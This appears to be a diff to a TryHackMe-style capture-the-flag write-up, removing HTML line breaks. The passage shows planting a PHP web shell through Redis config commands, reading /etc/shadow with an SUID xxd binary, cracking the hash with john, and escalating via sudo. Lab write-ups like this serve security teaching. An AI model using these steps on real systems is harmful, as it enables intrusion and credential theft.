@@ -73,9 +73,9 @@ command: ```redis-cli <target_ip>```
 
 Next, we'll specify the dbfilename with a filename of our selection. In this instance, we're designating it as "shell.php." Since it carries the ".php" extension, it's clear that we intend to insert PHP code into this file for execution.
 
-command: ```config set dir /var/www/html```</br>
-```config set dbfilename shell.php```</br>
-```set test "<?php system($_GET['cmd']) ?>" ```</br>
+command: ```config set dir /var/www/html```
+```config set dbfilename shell.php```
+```set test "<?php system($_GET['cmd']) ?>" ```
 ```save```
 
 with our RCE script ready we can hesd over to the path on our server
@@ -106,7 +106,7 @@ Going over to the home directory we list all files and folder, that got our firs
 
 ![image](/posts/res/flag.png)
 
-flag: ``` thm{red1s_rce_w1thout_credent1als} ```</br>
+flag: ``` thm{red1s_rce_w1thout_credent1als} ```
 
 
 3. What is the local user account password?
@@ -127,24 +127,24 @@ after some few seconds we can see our result /usr/bin/xxd looks vulnerable so le
   from my discovery i can see that the with this binary, we can only read files as root.
 
   Excellent! Now Let’s try this to read the /etc/shadow file to find the users password. 
- command: ```/usr/bin/xxd /etc/shadow | xxd -r```</br>
+ command: ```/usr/bin/xxd /etc/shadow | xxd -r```
 
 ![image](/posts/res/shadow.png)
 
- now we have successfully read the /etc/shadow file we can see that a user Vianka has a password hash on the machine. lets save that hash to a txt file and try cracking it with john.</br>
+ now we have successfully read the /etc/shadow file we can see that a user Vianka has a password hash on the machine. lets save that hash to a txt file and try cracking it with john.
  command:```john hash.txt --wordlist=<path_to_Word_list>rockyou.txt```
 ![image](/posts/res/pass.png)
-password ```beautiful1```</br>
+password ```beautiful1```
 
  we now have our password for the user vianka. lets attempts to login
 
- command: ```su vianka```</br>
+ command: ```su vianka```
 
  Let’s check what sudo privileges we have with sudo -l
 
  ![image](/posts/res/su.png)
 
- Great news! We now possess sudo privileges. To elevate our privileges, I'll execute the command `sudo su` and retrieve the `root.txt` file!</br>
+ Great news! We now possess sudo privileges. To elevate our privileges, I'll execute the command `sudo su` and retrieve the `root.txt` file!
  ![image](/posts/res/root.png)
 
 
